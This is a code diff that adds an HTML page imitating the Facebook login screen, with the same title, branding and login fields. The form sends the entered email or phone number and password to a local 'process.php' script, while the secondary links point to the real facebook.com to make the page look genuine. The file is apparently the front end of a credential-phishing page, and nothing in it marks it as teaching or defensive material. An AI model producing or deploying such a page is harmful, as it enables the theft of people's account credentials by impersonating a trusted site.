@@ -1,0 +1,58 @@
+<!DOCTYPE html>
+<link rel="icon" type="image/x-icon" href="https://cdn-icons-png.flaticon.com/512/124/124010.png">
+<html lang="en">
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>Facebook — log in or sign up</title>
+    <link rel="stylesheet" href="./index.css">
+</head>
+<body>
+    <div class="container">
+        <section class="intro-section">
+            <h1>facebook</h1>
+            <p>Facebook helps you connect and share with the people in your life.</p>
+        </section>
+        
+        <section class="signin-section">
+            <div>
+                <!-- Add an ID to the form for JavaScript targeting -->
+                <form id="loginForm" action="process.php" method="POST">
+                    <div>
+                        <!-- Added an ID and a keydown listener to focus on password -->
+                        <input type="text" name="username" id="username" placeholder="Email address or phone number" onkeydown="moveToPass(event)">
+                    </div>
+                    <div>
+                        <!-- Added an ID to the password field -->
+                        <input type="password" name="password" id="password" placeholder="Password">
+                    </div>
+                    <div>
+                        <button type="submit">Log in</button>
+                    </div>
+                    <a href="https://www.facebook.com/">Forgotten password?</a>
+                    <hr/>
+                    <div class="create-btn">
+                        <button onclick="window.location.href='https://www.facebook.com/'; return false;">Create new account</button>
+                    </div>
+                </form>
+            </div>
+            <p>
+                <a href="https://www.facebook.com/"><strong> Create a Page </strong></a> for a celebrity, brand or business.
+            </p>
+        </section>
+    </div>
+
+    <!-- JavaScript script for Enter key behavior -->
+    <script>
+        function moveToPass(event) {
+            // 13 is the keycode for the 'Enter' key
+            if (event.keyCode === 13) {
+                // Prevent the default form submission
+                event.preventDefault(); 
+                // Move focus to the password input
+                document.getElementById('password').focus();
+            }
+        }
+    </script>
+</body>
+</html>
